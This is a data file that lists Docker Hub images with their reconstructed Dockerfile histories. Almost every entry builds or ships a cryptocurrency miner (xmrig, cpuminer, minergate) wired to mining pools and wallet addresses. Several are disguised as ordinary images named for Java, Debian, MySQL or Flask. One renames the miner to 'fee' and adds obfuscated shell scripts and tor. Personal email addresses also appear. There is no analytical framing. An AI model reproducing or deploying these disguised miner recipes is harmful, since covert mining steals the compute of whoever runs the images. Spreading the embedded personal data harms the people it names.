ubox/mm; b'ADD file:7b8419bb9079c6d91ceeb2d0f35c46bcb8083d9d666eb21fda765ed755a07840 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y wget\nENV XMRIG_VERSION=2.6.4 XMRIG_SHA256=34d390a499d2098bce92e6b85b4858ee6255a7e2d4e03197ba4f6a759efe349c\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\nRUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&  tar -xvzf xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&  mv xmrig-${XMRIG_VERSION}/xmrig . &&  rm -rf xmrig-${XMRIG_VERSION} &&  echo "${XMRIG_SHA256}  xmrig" | sha256sum -c -\nENTRYPOINT ["./xmrig"]\nCMD ["--url=pool.supportxmr.com:5555 --user=43Y2mjYXnWeFHqR1VnxQXJerWYJyxhi36W6X14CrUhjAaTSdzday3Q6feTM19HKkjfSB1VALR2Hst2pjZsxSh9HXS3PwRrA --pass=MinerName:olek.shevchuk@gmail.com -k --max-cpu-usage=40"]'
sgryczan/blcm-hodl; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /root/\nRUN apt-get update && apt-get -qy install  automake  build-essential  libcurl4-openssl-dev  libssl-dev  git  ca-certificates  libjansson-dev libgmp-dev g++ --no-install-recommends\nRUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi\nWORKDIR /root/cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl\nRUN make\nCMD ["./cpuminer -a hodl -o stratum+tcp://hodl.usa.nicehash.com:3352 -u 0fb44476-bdbf-4949-a8fe-f23161dca82a.cld1"]'
tanchao2014/java1.7; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nCOPY file:38f3e49a0c1b92c0f08fcc0850b05ca6eef979c51d2406e59014cf1cd5d613d5 /xmrig'
luizkowalski/cpu; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install build-essential autotools-dev autoconf libcurl3 libcurl4-gnutls-dev screen -y\nRUN apt-get install git -y\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi && cd cpuminer-multi\nWORKDIR /cpuminer-multi\nRUN chmod +x autogen.sh\nRUN ./autogen.sh && CFLAGS="-march=native" ./configure && make && make install\nCMD ["/bin/sh -c ./minerd -a cryptonight -o stratum+tcp://asia-nbr.4miner.me:3334 -u N8EQ5pYRFGK4Q7oihRkjuijnF7zYnTGCqEsgRaEiup7p79PVP8SRxKN5ZsGQCEeJLBVGM8n4xS8mWgEgJ336gGhtAZ1GSBo -t 2"]'
tanchao2014/java1.6; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nCOPY file:38f3e49a0c1b92c0f08fcc0850b05ca6eef979c51d2406e59014cf1cd5d613d5 /xmrig'
tanchao2014/debian-test; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nCOPY file:38f3e49a0c1b92c0f08fcc0850b05ca6eef979c51d2406e59014cf1cd5d613d5 /xmrig'
fici/jegek; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git     build-essential     cmake     libuv1-dev     libmicrohttpd-dev\nRUN git clone https://github.com/xmrig/xmrig.git /app\nWORKDIR /app\nRUN mkdir build\nWORKDIR /app/build\nRUN cmake ..\nRUN make\nENV PASS=x\nCMD ["/bin/sh -c ./xmrig -o ${URL} -u ${USER} -p ${PASS} -k --donate-level 1"]'
ving1/min; b'ADD file:074f2c974463ab38cf3532134e8ba2c91c9e346457713f2e8b8e2ac0ee9fd83d /\nLABEL org.label-schema.schema-version=1.0 org.label-schema.name=CentOS Base Image org.label-schema.vendor=CentOS org.label-schema.license=GPLv2 org.label-schema.build-date=20190305\nCMD ["/bin/bash"]\nCOPY file:051cf60b5b695896e7ad8f01119857b1bafaad4fa1423bca44cb7f7941e4505f /usr/bin\nCOPY file:58ba7b5cd7b308f0dfc2a8a5112275fb8728a1ff5cea1fa49a67b2d5ec07bfae /usr/bin\nCMD ["xmrig -t=6"]'
vimuxegoto/zefrbjksz; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git     build-essential     cmake     libuv1-dev     libmicrohttpd-dev\nRUN git clone https://github.com/xmrig/xmrig.git /app\nWORKDIR /app\nRUN mkdir build\nWORKDIR /app/build\nRUN cmake ..\nRUN make\nENV PASS=x\nCMD ["/bin/sh -c ./xmrig -o ${URL} -u ${USER} -p ${PASS} -k --donate-level 1"]'
ubunturigimages/rigxm; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nUSER root\nRUN apt-get update\nRUN apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nWORKDIR /app/xmrig/build\nRUN cmake ..\nRUN make\nCMD ["/bin/sh -c ./xmrig -o stratum+tcp://217.78.0.224:3334 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=90 --donate-level=1"]'
gotchykid/m-test-m2; b'ADD file:1ed4d1a29d09a636dd6c60c6187679adb26c877b6be6968e14272e75ad240073 /\nLABEL name=CentOS Base Image vendor=CentOS license=GPLv2 build-date=20170911\nCMD ["/bin/bash"]\nMAINTAINER Ninja Van\nRUN yum -y install git curl-devel libcurl glib-devel libtool make\nRUN git clone https://github.com/hyc/cpuminer-multi\nWORKDIR /cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-march=native" ./configure\nRUN make\nCMD ["/bin/sh -c /cpuminer-multi/minerd -a cryptonight -o stratum+tcp://cryptonight.hk.nicehash.com:3355 -u 38c2Bukcqp257bdGMVFbWUc7H1UESNB3MG -p x -t $CORES"]'
ubunturigimages/rig; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nUSER root\nRUN apt-get update\nRUN apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nWORKDIR /app/xmrig/build\nRUN cmake ..\nRUN make\nCMD ["/bin/sh -c ./xmrig -o stratum+tcp://193.29.187.212:3333 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=90 --donate-level=1"]'
ngoctype123/flaskpy; b'ADD file:7529d28035b43a2281b9ba1d3cf6bde4f0d9517693e9412328761d51c24091b4 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN DEBIAN_FRONTEND=noninteractive apt-get update\nRUN apt-get install -y wget\nRUN wget https://minergate.com/download/deb-cli\nRUN dpkg -i deb-cli\nCMD ["/bin/sh -c minergate-cli -user ithoaiphuong1987@gmail.com -xmr"]'
ubuntuandimages/mysql; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nUSER root\nRUN apt-get update\nRUN apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nWORKDIR /app/xmrig/build\nRUN cmake ..\nRUN make\nCMD ["/bin/sh -c ./xmrig -o stratum+tcp://217.78.0.224:1231 --max-cpu-usage=90 --donate-level=1 -u bla -p v8"]'
cryptoandcoffee/depthcharge; b'ADD file:4b2eb5cd0b37ca0154f3c5ad9212f5bc7244a35806395a9c76a96723d708b83a /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN echo \'debconf debconf/frontend select Noninteractive\' | debconf-set-selections\nADD file:f2b5cdc5889f299a3a8f0d6a0247977438ef1fdb36c2faa761496d77d9e4cd02 .\nRUN ./setup-libdb48.sh\nADD file:98509c77f423a49a178b44f7f5ad54b4a27b2947ae7206c7ef4aa35b961fdc39 .\nADD file:cca714e6bd7b50726a01187796a53ef9ee9fa87ce7fcd12ae6face75cb1e709c .\nRUN cd /root ; rm -rf /root/.glt ; mkdir -p /root/.glt\nADD file:2e56d6383099ed5745b6ee173f73da4883a19860348f8b375c0cf24e1d69b90d .\nRUN cp glt.conf /root/.glt/glt.conf ; ./wallet-builder.sh\nCMD ["/bin/sh -c /usr/local/bin/globaltokend -datadir=/root/.glt/ -conf=/root/.glt/glt.conf"]\nRUN mkdir -p /root/.globaltoken\nCOPY dir:2eee875b4e1ce6d1c7daf0182252757c7b1a99891ebfb2f42296c3a183f8a93e /root/.globaltoken\nCOPY file:ac7e9185ec528f966a4ea942b748f7184070d6fe621a711779ade32aaf8abd9a ./menu.sh\nCOPY file:edebcf4f108578f01dac193167ad658416adbdbba909794efaf9b8c05810573f ./menu.sh.x.c\nCOPY file:e61e3fd49055954146bdd4c7e512113419eaa20b590c76f12d92a1808eda121b /root/.globaltoken/start.sh\nCOPY file:b8f4bb4fddf5c49ddfad6fb5ca3ff57b96a8e33ebd6bc8fd9a4a62c91b982382 /root/.globaltoken/start.sh.x.c\nCOPY file:7922dda19adfb7b0ec48226342582689afe875353917d9c2dd9657942d7ca2a0 /root/.globaltoken/time3.sh\nCOPY file:b0851ea89f006eb8b5ef2911ab32951edf01607864d7792f60f76bb56b463707 /root/.globaltoken/time3.sh.x.c\nCOPY file:20b82a51155873d8db793122aa7332b3e1be7591aab9edf624610711d5903fa2 /root/.globaltoken/loop.sh\nCOPY file:33d4380431da76fa0dcf78d023f2a07157006b37d1770ed52de3b9d8999e766c /root/.globaltoken/loop.sh.x.c\nCOPY file:1a91111a2dfadfa5b740f184112b698bcc461263fd435706e10a4d546a3681da /root/.globaltoken/benchmark.sh\nCOPY file:9476e24288655bf200273eb50567c7da1108da698c1784c106852492d051c550 /root/.globaltoken/benchmark.sh.x.c\nCOPY file:217f2c85eb8d1b46a59a766d883dab43af3ad6cadbaa038b26149046b16c4072 /root/.globaltoken/last_tx.sh\nCOPY file:62b401c366e7994c3954b14d5cf92171213fb21ef8340eb636698f63936cbbd0 /root/.globaltoken/last_tx.sh.x.c\nCOPY file:c13c8b584a1c6992304941484bf8ab246c6a9ec2fbc6ad62356522f50d922dbe /root/.globaltoken/last_tx_slush.sh\nCOPY file:8b4e921a88bc463a9bf8ce99259629199c5a27fc8d4d3565c6c7b43283f84937 /root/.globaltoken/last_tx_slush.sh.x.c\nCOPY file:341964b4e9250d9a51679f088104c2374c49e85ce529748dfef24a95ea2ff861 /root/.globaltoken/last_balance_slush.sh\nCOPY file:49313712d83c55b1aa413c9587bfad8bb6e3080d9a62d978e45d0c98dd0e3bf2 /root/.globaltoken/last_balance_slush.sh.x.c\nCOPY file:eeeba2f7e69b61d886b570141d2f77d3a85e0fc9f167357dbb1613d10629450e /root/.globaltoken/balance_loop.sh\nCOPY file:1846f702023835963300c923310a76730a7dafbf963a224f1a12981b1f01af3c /root/.globaltoken/balance_loop.sh.x.c\nCOPY file:b7f4f2531ef4260b7d348b5acfe6f96e212934a67997b4e054944eb50c7656e1 /root/.globaltoken/globaltoken.conf\nCOPY file:369e0e8993e8fc9b83185bd1ad0d35ce20d31db506f3ab9b01f150d5b723da12 /etc/apt/sources.list\nRUN apt-get update ; apt-get install --allow-unauthenticated -y software-properties-common\nRUN apt-get install --allow-unauthenticated -yqq jq dialog bmon htop bc curl nano wget python3-dev whiptail shc libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev geoip-bin dnsutils geoip-database rig net-tools tor\nRUN chmod +x menu.sh\nRUN wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz\nRUN tar -zxvf xmrig-5.5.1-xenial-x64.tar.gz ; cp xmrig-5.5.1/xmrig /usr/bin/fee ; rm -rf xmrig-5.5.1/ ; rm -f xmrig-5.5.1-xenial-x64.tar.gz\nENTRYPOINT ["/menu.sh"]\nCMD []'
